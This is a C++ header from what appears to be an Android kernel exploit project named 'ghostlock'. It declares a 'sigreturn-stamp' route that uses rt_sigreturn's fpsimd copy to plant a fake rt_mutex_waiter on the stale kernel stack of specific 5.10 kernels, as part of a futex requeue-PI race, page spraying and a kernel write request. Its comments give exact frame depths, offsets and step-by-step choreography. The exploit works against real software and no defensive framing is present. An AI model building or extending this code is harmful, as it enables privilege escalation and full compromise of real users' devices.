#ifndef SIGRETURN_ROUTE_H
#define SIGRETURN_ROUTE_H

/* The sigreturn-stamp route: deliver the fake rt_mutex_waiter through
 * `rt_sigreturn`'s fpsimd copy instead of the pselect fd_set buffer.
 *
 * Why it exists: `route.select_stack` cannot reach the waiter on the two
 * Android-12-era diting kernels (5.10.81 / 5.10.101). There `do_futex`'s frame
 * is 0x20 instead of 0x70, which puts the `futex_wait_requeue_pi` waiter at
 * depth 0x1c0 below the syscall-entry sp while the pselect fd_set buffer is
 * fixed at 0x210 -- only waiter bytes 0x00-0x1f are reachable, and the words
 * the walk dereferences (`task` +0x30, `lock` +0x38) are not among them.
 *
 * The primitive: `restore_fpsimd_context` / `restore_sve_fpsimd_context` run
 *     __copy_from_user(fpsimd.vregs, ctx->vregs, 0x200)
 * from a user-controlled signal frame, at a copy destination deep enough to
 * cover the whole 0x58-byte waiter strip on both geometries. The waiter byte 0
 * lands at offset
 *     waiter_off = chain_sum - dst_offset - waiter_depth
 * inside the 0x200 copied bytes (SVE dst sp+0x10 vs plain dst sp+0x00 are two
 * different offsets: `route.sigreturn.waiter_off_{sve,plain}`).
 *
 * The choreography is variant A of the plan
 * (docs/analysis/sigreturn-stamp-route-plan.md): the victim -- the route's own
 * waiter thread, which already carries the stale waiter on its kernel stack --
 * installs a SA_SIGINFO handler, then loops `tgkill(self)`; the kernel builds
 * the frame, the handler splices the strip into the frame's fpsimd record, and
 * returning from the handler runs rt_sigreturn, which performs the copy. The
 * loop re-stamps until the consumer's walk reports back, because a tick landing
 * on the user-mode victim writes the scheduler's frames (measured depth 0x290)
 * over the strip. No fds, no blocking call: the stamp lingers on the stack
 * until the next deep syscall or EL0 preemption. */

#include "memory/payload_builder.h"
#include "profile/model.h"
#include "race/pi_race.h"
#include "route/route_status.h"

#include <array>
#include <cstddef>
#include <cstdint>
#include <signal.h>

namespace ghostlock::route::sigreturn {
    /* The copy's own size (n=0x200) and the waiter strip that must fit in it. */
    inline constexpr std::size_t kCopyBytes = 0x200;
    inline constexpr std::size_t kStripBytes = memory::kWaiterBytes;

    struct Geometry final {
        std::size_t off_sve = 0;
        std::size_t off_plain = 0;
    };

    /* Validate the profile's two offsets. Refuses when either is absent (a
     * profile must state both -- the handler has to place the strip before it
     * knows which restore helper the kernel will take), unaligned (the strip's
     * words have to land 8-aligned), zero, or so large that the strip would not
     * fit the copy window. */
    [[nodiscard]] bool geometry_from(const profile::SigreturnLayout &layout,
                                     Geometry *out) noexcept;

    /* Where the fpsimd record sits in a delivered frame's `__reserved` area,
     * and whether the frame also carries an SVE record (which selects the
     * restore helper, and therefore the placement offset). */
    struct FpState final {
        std::size_t vregs_offset = 0;
        bool sve = false;
    };

    [[nodiscard]] bool locate_fpstate(const void *reserved, std::size_t reserved_bytes,
                                      FpState *out) noexcept;

    /* Place `strip` at the path's offset inside the frame's vregs array --
     * this *is* the stamp. `sve_path` reports which offset was used. Returns
     * false without writing when the frame has no fpsimd record or the strip
     * does not fit; nothing else in the frame is touched. */
    [[nodiscard]] bool patch_fpstate(void *reserved, std::size_t reserved_bytes,
                                     const void *strip, std::size_t strip_bytes,
                                     const Geometry &geometry,
                                     bool *sve_path) noexcept;

    /* One attempt at one route write. Lifecycle mirrors SelectStackRoute:
     * prepare (geometry + handler + first stamp) -> execute (stamp loop against
     * the consumer's walk) -> disarm (stop and wait for the consumer) ->
     * destroy (restore the signal disposition, restore the thread's mask). */
    class SigreturnRoute final {
    public:
        SigreturnRoute(ghostlock::race::PiRace *race,
                       const ghostlock::memory::WriteRequest *request,
                       const ghostlock::profile::TargetProfile &profile_value,
                       ghostlock::profile::SigreturnLayout route_layout) noexcept;

        ~SigreturnRoute() noexcept = default;

        SigreturnRoute(const SigreturnRoute &) = delete;

        SigreturnRoute &operator=(const SigreturnRoute &) = delete;

        [[nodiscard]] int32_t prepare() noexcept;

        [[nodiscard]] ghostlock::route::RouteStatus execute() noexcept;

        void disarm() noexcept;

        void destroy() noexcept;

        [[nodiscard]] int32_t fail(int32_t step, int32_t error_number) noexcept;

        ghostlock::race::PiRace *race = nullptr;
        const ghostlock::memory::WriteRequest *request = nullptr;
        const ghostlock::profile::TargetProfile &profile;
        ghostlock::profile::SigreturnLayout layout{};
        Geometry geometry{};
        /* The eleven words the handler splices; rebuilt per attempt from the
         * page that attempt sprayed. */
        std::array<std::byte, kStripBytes> strip{};
        /* The waiter's `lock` word of the last stamp: the anchor slot, or the
         * reclaimed page's fake lock when the profile carries no anchor. */
        uintptr_t lock_word = 0;
        struct sigaction previous_action {};
        sigset_t previous_mask {};
        int32_t trigger_signal = 0;
        int32_t trigger_tid = -1;
        int32_t trigger_pid = -1;
        int32_t handler_installed = 0;
        int32_t mask_changed = 0;
        int32_t consumer_stuck = 0;
        int32_t stamps = 0;
        int32_t stamp_misses = 0;
        int32_t consumer_calls = 0;
        int32_t consumer_successes = 0;
        ghostlock::route::RouteStatus status{};

    private:
#if defined(__ANDROID__)
        [[nodiscard]] bool install_trigger() noexcept;

        [[nodiscard]] bool build_stamp(int32_t attempt) noexcept;

        void stamp_window(const struct timespec &started) noexcept;
#endif
    };
} // namespace ghostlock::route::sigreturn

#endif
